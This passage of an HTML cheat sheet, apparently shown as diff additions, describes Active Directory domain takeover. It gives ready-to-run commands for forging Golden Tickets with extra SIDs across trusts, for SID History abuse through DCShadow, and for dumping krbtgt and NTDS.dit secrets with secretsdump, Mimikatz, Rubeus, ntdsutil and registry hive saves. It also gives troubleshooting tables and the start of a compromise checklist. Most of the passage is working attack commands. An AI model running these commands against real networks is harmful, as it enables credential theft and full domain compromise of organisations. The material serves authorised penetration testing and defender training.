+<td>Child <code>krbtgt</code> hash/key</td>
+<td>From DCSync in child domain.</td>
+</tr>
+</tbody>
+</table>
+<p>Get child domain SID:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">dev</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+<p>Get parent domain SID:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+<p>Linux with lookupsid:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>lookupsid.py<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Dump child <code>krbtgt</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Create Golden Ticket with extra SID:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>CHILD_KRBTGT_NT_HASH<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>-domain-sid<span class="w"> </span><span class="nv">$CHILD_SID</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>-domain<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>-extra-sid<span class="w"> </span><span class="si">${</span><span class="nv">PARENT_SID</span><span class="si">}</span>-519<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>Administrator
+</span></code></pre></div>
+<p>Use ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>klist
+</span></code></pre></div>
+<p>Access parent DC:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span>/Administrator@parentdc.corp.local
+</span></code></pre></div>
+<p>Alternative access validation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span>/Administrator@parentdc.corp.local<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Mimikatz Golden Ticket with extra SID:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>mimikatz.exe
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>kerberos::golden /user:Administrator /domain:dev.corp.local /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_HASH /sids:PARENT_DOMAIN_SID-519 /ptt
+</span></code></pre></div>
+<p>Common extra SIDs:</p>
+<table>
+<thead>
+<tr>
+<th>SID suffix</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-519</code></td>
+<td>Enterprise Admins.</td>
+</tr>
+<tr>
+<td><code>-512</code></td>
+<td>Domain Admins.</td>
+</tr>
+<tr>
+<td><code>-518</code></td>
+<td>Schema Admins.</td>
+</tr>
+<tr>
+<td><code>-520</code></td>
+<td>Group Policy Creator Owners.</td>
+</tr>
+</tbody>
+</table>
+<p>Common blockers:</p>
+<table>
+<thead>
+<tr>
+<th>Blocker</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SID filtering</td>
+<td>Extra SID abuse may fail.</td>
+</tr>
+<tr>
+<td>Wrong SID</td>
+<td>Ticket works incorrectly or access denied.</td>
+</tr>
+<tr>
+<td>Wrong krbtgt key</td>
+<td>Ticket invalid.</td>
+</tr>
+<tr>
+<td>DNS/SPN mismatch</td>
+<td>Kerberos access fails.</td>
+</tr>
+<tr>
+<td>Time skew</td>
+<td>Kerberos ticket rejected.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="sid-history">SID History</h2>
+<p><code>sIDHistory</code> allows an account to carry previous SIDs after migration.</p>
+<p>It can be abused if an attacker can add privileged SIDs to an account.</p>
+<p>Search for SID history:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>-b<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(sIDHistory=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>sAMAccountName<span class="w"> </span>objectSid<span class="w"> </span>sIDHistory
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(sIDHistory=*)&quot;</span> <span class="n">-Properties</span> <span class="n">sidhistory</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">Get-DomainObject</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(sIDHistory=*)&quot;</span>
+</span></code></pre></div>
+<p>Common privileged SIDs:</p>
+<table>
+<thead>
+<tr>
+<th>SID</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DOMAIN_SID-512</code></td>
+<td>Domain Admins.</td>
+</tr>
+<tr>
+<td><code>DOMAIN_SID-519</code></td>
+<td>Enterprise Admins.</td>
+</tr>
+<tr>
+<td><code>DOMAIN_SID-518</code></td>
+<td>Schema Admins.</td>
+</tr>
+<tr>
+<td><code>DOMAIN_SID-500</code></td>
+<td>Built-in Administrator account.</td>
+</tr>
+</tbody>
+</table>
+<p>Golden Ticket with extra SID using Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>-extra-sid<span class="w"> </span><span class="si">${</span><span class="nv">DOMAIN_SID</span><span class="si">}</span>-512<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>Administrator
+</span></code></pre></div>
+<p>Mimikatz extra SID:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:DOMAIN_SID-512 /ptt
+</span></code></pre></div>
+<p>DCShadow can also be used in labs to push <code>sIDHistory</code> changes if the required high privileges are available:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-2222222222-3333333333-512
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>lsadump::dcshadow /push
+</span></code></pre></div>
+<p>Validate token/group effect:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>whoami /groups
+</span></code></pre></div>
+<p>Kerberos validation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>klist
+</span></code></pre></div>
+<p>Common issues:</p>
+<table>
+<thead>
+<tr>
+<th>Issue</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SID filtering</td>
+<td>Cross-domain SID may be filtered.</td>
+</tr>
+<tr>
+<td>Token not refreshed</td>
+<td>Logon or ticket refresh needed.</td>
+</tr>
+<tr>
+<td>Wrong SID suffix</td>
+<td>Privilege not granted.</td>
+</tr>
+<tr>
+<td>DCShadow failed</td>
+<td>Replication-style modification did not apply.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="krbtgt">KRBTGT</h2>
+<p>The <code>krbtgt</code> account is the Kerberos Ticket Granting Ticket service account for the domain.</p>
+<p>Its key material is used to sign and encrypt TGTs.</p>
+<p>If the <code>krbtgt</code> hash or AES key is compromised, an attacker can forge TGTs such as Golden Tickets.</p>
+<p>Dump <code>krbtgt</code> with DCSync:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/admin.ccache
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>mimikatz.exe
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>lsadump::dcsync /domain:corp.local /user:krbtgt
+</span></code></pre></div>
+<p>Important <code>krbtgt</code> material:</p>
+<table>
+<thead>
+<tr>
+<th>Material</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NT hash / RC4 key</td>
+<td>Golden Ticket with RC4.</td>
+</tr>
+<tr>
+<td>AES128 key</td>
+<td>Kerberos ticket forging with AES128.</td>
+</tr>
+<tr>
+<td>AES256 key</td>
+<td>Kerberos ticket forging with AES256.</td>
+</tr>
+<tr>
+<td>Password history</td>
+<td>Old tickets may validate during rotation window.</td>
+</tr>
+</tbody>
+</table>
+<p>Create Golden Ticket with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>With AES:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>KRBTGT_AES256_KEY<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>Use ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>klist
+</span></code></pre></div>
+<p>Validate:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span>
+</span></code></pre></div>
+<p>Mimikatz Golden Ticket:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /ptt
+</span></code></pre></div>
+<p>Rubeus Golden Ticket:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">KRBTGT_NT_HASH</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">DOMAIN_SID</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span><span class="p">,</span><span class="n">513</span><span class="p">,</span><span class="n">518</span><span class="p">,</span><span class="n">519</span><span class="p">,</span><span class="n">520</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Operationally important facts:</p>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>krbtgt</code> is domain-specific</td>
+<td>One domain's <code>krbtgt</code> does not automatically control another domain.</td>
+</tr>
+<tr>
+<td>Two rotations are commonly needed</td>
+<td>Old and current keys may both be accepted during transition.</td>
+</tr>
+<tr>
+<td>Forged tickets can outlive passwords</td>
+<td>Ticket lifetime and validation behavior matter.</td>
+</tr>
+<tr>
+<td>AES keys are preferred in modern domains</td>
+<td>RC4 may be disabled or monitored.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="ntds-dumping">NTDS Dumping</h2>
+<p><code>NTDS.dit</code> is the Active Directory database on domain controllers.</p>
+<p>It contains directory data, including password-related material for domain accounts.</p>
+<p>Common NTDS dumping methods:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DRSUAPI / DCSync</td>
+<td>Remote replication method.</td>
+</tr>
+<tr>
+<td>VSS</td>
+<td>Volume Shadow Copy extraction.</td>
+</tr>
+<tr>
+<td>IFM</td>
+<td><code>ntdsutil</code> Install From Media copy.</td>
+</tr>
+<tr>
+<td>Offline copy</td>
+<td>Extract <code>NTDS.dit</code> and SYSTEM hive from disk/backup.</td>
+</tr>
+<tr>
+<td>Backup restore</td>
+<td>Extract from DC backup if authorized.</td>
+</tr>
+</tbody>
+</table>
+<p>Remote DCSync-style dump with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc
+</span></code></pre></div>
+<p>Dump only NTLM hashes:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-ntlm
+</span></code></pre></div>
+<p>Dump one user:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>VSS method with Impacket if the account has required rights:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-use-vss
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-use-vss
+</span></code></pre></div>
+<p>Create IFM copy on DC in a lab:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>ntdsutil &quot;activate instance ntds&quot; &quot;ifm&quot; &quot;create full C:\Windows\Temp\ntds_ifm&quot; quit quit
+</span></code></pre></div>
+<p>Save registry hives:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>reg save HKLM\SAM C:\Windows\Temp\SAM
+</span></code></pre></div>
+<p>Common NTDS paths:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>C:\Windows\NTDS\NTDS.dit
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>C:\Windows\System32\config\SYSTEM
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>C:\Windows\System32\config\SECURITY
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>C:\Windows\System32\config\SAM
+</span></code></pre></div>
+<p>Offline parsing with secretsdump:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>secretsdump.py<span class="w"> </span>-ntds<span class="w"> </span>NTDS.dit<span class="w"> </span>-system<span class="w"> </span>SYSTEM<span class="w"> </span>LOCAL
+</span></code></pre></div>
+<p>With SECURITY hive:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>secretsdump.py<span class="w"> </span>-ntds<span class="w"> </span>NTDS.dit<span class="w"> </span>-system<span class="w"> </span>SYSTEM<span class="w"> </span>-security<span class="w"> </span>SECURITY<span class="w"> </span>LOCAL
+</span></code></pre></div>
+<p>Copy from admin share if available and in scope:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>smbclient<span class="w"> </span>//<span class="nv">$DC_IP</span>/C$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Typical artifacts:</p>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>NTDS.dit</code></td>
+<td>AD database.</td>
+</tr>
+<tr>
+<td><code>SYSTEM</code></td>
+<td>Bootkey needed to decrypt secrets.</td>
+</tr>
+<tr>
+<td><code>SECURITY</code></td>
+<td>LSA secrets.</td>
+</tr>
+<tr>
+<td><code>SAM</code></td>
+<td>Local account hashes.</td>
+</tr>
+<tr>
+<td>IFM directory</td>
+<td>Safer exported NTDS copy.</td>
+</tr>
+<tr>
+<td>VSS snapshot</td>
+<td>Snapshot-based extraction source.</td>
+</tr>
+</tbody>
+</table>
+<p>Common errors:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File locked</td>
+<td>Direct copy of live NTDS failed. Use VSS/IFM.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Missing DC admin/backup privileges.</td>
+</tr>
+<tr>
+<td>Decryption fails</td>
+<td>Missing or wrong SYSTEM hive.</td>
+</tr>
+<tr>
+<td>Network interruption</td>
+<td>Large dump/copy failed.</td>
+</tr>
+<tr>
+<td>EDR interference</td>
+<td>Tooling blocked or quarantined.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="domain-compromise-checklist">Domain Compromise Checklist</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm current privilege level</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>whoami
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>whoami /groups
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm domain, forest, and DC context</strong></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="nb">Get-ADDomain</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="nb">Get-ADForest</span>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="nb">Get-ADDomainController</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>nltest /domain_trusts
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>nltest /dclist:corp.local
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check Domain Admin control</strong></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recurse</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check Enterprise Admin control</strong></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Enterprise Admins&quot;</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-Recurse</span>
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a><span class="nb">Get-ForestDomain</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Validate DCSync rights against one account</strong></li>
+</ul>
